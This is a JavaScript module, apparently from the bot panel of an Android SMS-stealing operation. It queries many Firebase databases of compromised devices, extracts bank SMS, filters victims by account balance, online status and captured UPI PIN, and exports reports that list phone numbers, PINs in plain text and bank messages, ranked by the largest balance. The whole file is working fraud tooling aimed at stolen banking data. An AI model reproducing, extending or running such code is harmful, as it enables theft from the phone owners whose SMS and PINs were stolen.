import { fetchPanelDevices, normalizeFirebaseUrl } from './panelCore.mjs';
import { processBankMessages, formatSmsWhen, devicePeakAmount } from './bankSms.mjs';
import { mapPool } from './pool.mjs';

const TIERS = {
  low_high: { min: 2_000, max: 50_000, label: 'BAL 2K–50K (bada→chota)', sort: 'desc' },
  high_low: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L (bada→chota)', sort: 'desc' },
  mixed_all: { min: 0, max: 9_999_999_999, label: 'MIXED ALL AMOUNT', sort: 'desc', allAmounts: true },
  bank70k: { min: 70_000, max: 10_000_000, label: 'Bank 70K–1Cr', sort: 'desc' },
  user30_90L: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L', sort: 'desc' },
};

const SMS_LIMIT = { 1: 550, 3: 900, 7: 1200, 15: 1600, 30: 2000, 0: 2500 };
const PANEL_PARALLEL = 80;
const DEVICE_SMS_BATCH = 14;

export function parseSearchCommand(text) {
  const raw = text.replace(/^\/searchbank\s*/i, '').replace(/^\/search\s*/i, '').trim();
  const isBankHigh = /^\/searchbank/i.test(text);
  const parts = raw.split(/[,|]/).map(s => s.trim().toLowerCase()).filter(Boolean);

  const opts = {
    keywords: [],
    online: true,
    offline: false,
    bothStatus: false,
    pinBoth: true,
    pinOnly: false,
    noPinOnly: false,
    days: 1,
    tier: isBankHigh ? 'bank70k' : 'low_high',
    bankOnly: true,
    avlBal: false,
  };

  for (const p of parts) {
    if (p === 'online') {
      opts.online = true;
      opts.offline = false;
      opts.bothStatus = false;
    } else if (p === 'offline') {
      opts.offline = true;
      opts.online = false;
      opts.bothStatus = false;
    } else if (p === 'both') {
      opts.bothStatus = true;
      opts.online = false;
      opts.offline = false;
    } else if (/^\d+\s*d(ays?)?$/.test(p) || /^last\s*\d+/.test(p)) {
      opts.days = parseInt(p.match(/\d+/)?.[0] || '1', 10);
    } else if (p === 'high' || p === 'high-low') opts.tier = 'high_low';
    else if (p === 'low' || p === 'low-high') opts.tier = 'low_high';
    else if (p === 'mixed' || p === 'all' || p === 'mixed all') opts.tier = 'mixed_all';
    else if (p === '30k' || p === '30-90l') opts.tier = 'user30_90L';
    else if (/avl|bal/.test(p)) opts.avlBal = true;
    else if (p === 'bank' || p === 'bank online') opts.bankOnly = true;
    else opts.keywords.push(p);
  }

  return opts;
}

function devicePassesStatus(d, opts) {
  if (opts.bothStatus) return true;
  if (opts.online && !opts.offline) return d.status;
  if (opts.offline && !opts.online) return !d.status;
  return true;
}

function devicePassesPin(d, opts) {
  if (opts.pinBoth) return true;
  if (opts.pinOnly) return d.hasPin;
  if (opts.noPinOnly) return !d.hasPin;
  return true;
}

async function fetchDeviceMessages(device, limit = 800) {
  const base = normalizeFirebaseUrl(device.panelUrl);
  const params = new URLSearchParams({
    orderBy: '"$key"',
    limitToLast: String(limit),
  });
  if (device.panelKey?.trim()) params.set('auth', device.panelKey.trim());
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 4000);
  try {
    const res = await fetch(`${base}/messages/${encodeURIComponent(device.id)}.json?${params}`, {
      signal: ctrl.signal,
      headers: { Accept: 'application/json' },
    });
    clearTimeout(timer);
    if (!res.ok) return null;
    const data = await res.json();
    if (data?.error) return null;
    return data;
  } catch {
    clearTimeout(timer);
    return null;
  }
}

function smsLimitForDays(days) {
  if (days <= 1) return SMS_LIMIT[1];
  if (days <= 3) return SMS_LIMIT[3];
  if (days <= 7) return SMS_LIMIT[7];
  if (days <= 15) return SMS_LIMIT[15];
  if (days <= 30) return SMS_LIMIT[30];
  return SMS_LIMIT[0];
}

function rowPassesTier(row, tier, opts) {
  const amt = row.peakAmount ?? devicePeakAmount(row);
  const allAmt = tier.allAmounts || opts.tier === 'mixed_all';
  if (allAmt) return true;
  if (amt > 0 && (amt < tier.min || amt > tier.max)) return false;
  if (
    amt === 0 &&
    (opts.tier === 'high_low' || opts.tier === 'user30_90L' || opts.tier === 'bank70k')
  ) {
    return false;
  }
  return true;
}

async function scanDeviceSms(d, opts, tier, limit, results) {
  try {
    const data = await fetchDeviceMessages(d, limit);
    const r = processBankMessages(data, opts.days);
    if (!r.bankSmsCount) return;
    if (opts.avlBal && !r.maxBalance && !r.bankSms.some(m => /avl\s*bal/i.test(m.text))) return;
    const row = { ...d, bankSms: r.bankSms, maxBalance: r.maxBalance, maxTxn: r.maxTxn };
    row.peakAmount = devicePeakAmount(row);
    if (!rowPassesTier(row, tier, opts)) return;
    results.push(row);
  } catch (_) {}
}

export function buildSearchHeader(opts, tier) {
  const pinPart = opts.pinBoth ? 'PIN: WITH + WITHOUT PIN' : 'PIN: FILTERED';
  const statPart = opts.bothStatus
    ? 'ONLINE + OFFLINE'
    : opts.online
      ? 'ONLINE DEVICES ONLY'
      : 'OFFLINE DEVICES ONLY';
  const dayPart = opts.days === 0 ? 'ALL TIME' : `LAST ${opts.days} DAY(S)`;
  return `SMS SEARCH RESULTS- AVL/BAL & BANK- ${statPart}- ${pinPart}- ${tier.label}- ${dayPart}`;
}

export function buildExportText(results, opts, tier, panelsTotal, dbPanelsHit, elapsedMs, panelsDone) {
  const smsTotal = results.reduce((s, r) => s + (r.bankSms?.length || 0), 0);
  const gen = new Date().toLocaleString('en-IN', { hour12: false }).replace(',', '');
  const lines = [
    buildSearchHeader(opts, tier),
    `Generated: ${gen}`,
    `Search time: ${(elapsedMs / 1000).toFixed(0)}s`,
    `Stats: Total Matches: ${smsTotal} | Devices: ${results.length} | DBs done: ${panelsDone}/${panelsTotal} (hit: ${dbPanelsHit})`,
    '',
  ];

  results.forEach((d, i) => {
    const smsList = d.bankSms || [];
    lines.push(`----------------+#[${i + 1}]-----------------`);
    lines.push(`Firebase: ${normalizeFirebaseUrl(d.panelUrl)}`);
    lines.push(`Device ID: ${d.id}`);
    lines.push(`Phone: ${d.phone || '—'}`);
    if (d.hasPin && d.pinValue) {
      lines.push(`UPI PIN: YES | PIN: ${d.pinValue}`);
    } else if (d.hasPin) {
      lines.push('UPI PIN: YES');
    } else {
      lines.push('UPI PIN: NO');
    }
    const peak = d.peakAmount || devicePeakAmount(d);
    if (peak) lines.push(`Peak Amount: Rs.${peak.toLocaleString('en-IN')}`);
    else if (d.maxBalance) lines.push(`Peak Avl Bal: Rs.${d.maxBalance.toLocaleString('en-IN')}`);
    lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | SMS Count: ${smsList.length}`);
    lines.push(`Panel: ${d.panelName || '—'}`);
    lines.push('');
    smsList.forEach(m => {
      const when = formatSmsWhen(m.ts, m.time);
      lines.push('---------------------------------------------------');
      const tag =
        m.txnType && ['NEFT', 'IMPS', 'RTGS', 'UPI', 'credit', 'debit'].includes(m.txnType)
          ? m.txnType.toUpperCase()
          : m.txnType === 'credit'
            ? 'CREDIT'
            : m.txnType === 'debit'
              ? 'DEBIT'
              : 'BANK';
      lines.push(`[${m.sender}] | ${tag} | ${when}`);
      lines.push(m.text);
    });
    lines.push('');
  });
  return lines.join('\n');
}

/**
 * Single-phase search: har panel = clients → filter → SMS (no global device list).
 */
export async function runSearch(panels, opts, onProgress) {
  const tier = TIERS[opts.tier] || TIERS.low_high;
  const t0 = Date.now();
  const panelsHit = new Set();
  const results = [];
  const limit = smsLimitForDays(opts.days);
  let panelsDone = 0;
  let devicesSmsDone = 0;

  await mapPool(panels, PANEL_PARALLEL, async panel => {
    let devices = [];
    try {
      devices = await fetchPanelDevices(panel);
    } catch {
      devices = [];
    }
    if (devices.length) panelsHit.add(panel.url.toLowerCase());

    const toScan = devices.filter(d => devicePassesStatus(d, opts) && devicePassesPin(d, opts));
    for (let k = 0; k < toScan.length; k += DEVICE_SMS_BATCH) {
      const chunk = toScan.slice(k, k + DEVICE_SMS_BATCH);
      await Promise.all(chunk.map(d => scanDeviceSms(d, opts, tier, limit, results)));
      devicesSmsDone += chunk.length;
    }

    const done = ++panelsDone;
    if (done % 40 === 0 || done === panels.length) {
      onProgress?.({
        panelsDone: done,
        panelsTotal: panels.length,
        devices: devicesSmsDone,
        matched: results.length,
      });
    }
  });

  const filtered = results.filter(r => (r.bankSms?.length || 0) > 0);
  filtered.sort((a, b) => {
    const aa = a.peakAmount || devicePeakAmount(a);
    const ab = b.peakAmount || devicePeakAmount(b);
    return ab - aa;
  });

  const elapsed = Date.now() - t0;
  const text = buildExportText(
    filtered,
    opts,
    tier,
    panels.length,
    panelsHit.size,
    elapsed,
    panelsDone
  );
  const sms = filtered.reduce((s, r) => s + r.bankSms.length, 0);

  return {
    results: filtered,
    text,
    stats: {
      devices: filtered.length,
      sms,
      panelsHit: panelsHit.size,
      panelsDone,
      panelsTotal: panels.length,
      scanned: devicesSmsDone,
      withBankSms: results.length,
    },
    elapsed,
    tier,
    opts,
  };
}

export function searchHelpText() {
  return (
    '🔎 *Search Commands*\n\n' +
    'Step flow (tap buttons):\n' +
    '`/search avl/bal, bank online`\n' +
    '→ Online / Offline / Both\n' +
    '→ 1 / 3 / 7 / 15 / 30 days · All time\n' +
    '→ With PIN · Without · Both\n' +
    '→ Low/High · ▶ Start\n\n' +
    'Quick (no taps): `/search avl/bal, bank online now`\n' +
    '🏦 `/searchbank`\n' +
    '🔥 `/fbscan` — fast online report + valid TXT\n' +
    '/done = cancel'
  );
}